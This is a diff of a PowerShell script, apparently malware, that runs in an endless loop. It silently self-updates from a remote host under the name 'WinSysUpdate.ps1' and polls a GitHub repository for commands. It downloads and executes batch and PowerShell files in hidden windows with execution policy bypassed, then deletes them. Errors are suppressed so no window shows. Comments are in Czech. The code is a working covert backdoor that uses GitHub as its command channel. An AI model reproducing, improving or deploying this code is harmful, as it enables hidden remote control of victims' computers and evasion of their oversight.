@@ -1,4 +1,4 @@
-# --- UNIVERSAL WATCHER WITH AUTO-CLEAN ---
+# --- UNIVERSAL WATCHER ---
 $dir = Split-Path $MyInvocation.MyCommand.Path
 $configFile = Join-Path $dir "config.txt"
 
@@ -11,46 +11,43 @@ if (Test-Path $configFile) {
 
 while($true) {
     try {
-        # 1. Self-Update logic
-        $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
+        # 1. Self-Update
+        $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing -TimeoutSec 10 | Select-Object -ExpandProperty Content
         if ($remote -and $remote -ne (Get-Content $MyInvocation.MyCommand.Path -Raw)) {
             Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
             Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
             exit
         }
 
-        # 2. Fetching commands from GitHub API
-        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/$user/$repo/contents/"
+        # 2. Check GitHub API
+        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/$user/$repo/contents/" -UseBasicParsing
         foreach ($f in $files) {
             $n = $f.name
             $u = $f.download_url
 
-            # --- CREATE command (Stay on disk) ---
             if ($n -like "create_*") {
                 $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                 Set-Content -Path (Join-Path $dir ($n -replace "create_","")) -Value $c
             }
 
-            # --- RUN command (Auto-delete after start) ---
             if ($n -like "run_*") {
                 $p = Join-Path $dir $n
-                Invoke-WebRequest -Uri $u -OutFile $p
+                # Stáhneme soubor (přepíšeme existující, pokud tam je)
+                Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
                 
+                # Spustíme bez čekání (-Wait odstraněno pro stabilitu)
                 if ($n -like "*.bat") { 
-                    # Spustí a počká na dokončení
-                    Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden -Wait 
+                    Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden
                 }
                 elseif ($n -like "*.ps1") { 
-                    # Spustí a počká na dokončení
-                    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden -Wait 
+                    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden
                 }
 
-                # SMAŽE SOUBOR Z PC (WinData), aby se nespouštěl znovu
-                if (Test-Path $p) { Remove-Item -Path $p -Force }
+                # Počkáme 2 sekundy a pak zkusíme smazat
+                Start-Sleep -Seconds 2
+                if (Test-Path $p) { Remove-Item -Path $p -Force -ErrorAction SilentlyContinue }
             }
         }
-    } catch { 
-        # Tiché chyby, aby okno neblikalo
-    }
+    } catch { }
     Start-Sleep -Seconds 30
 }
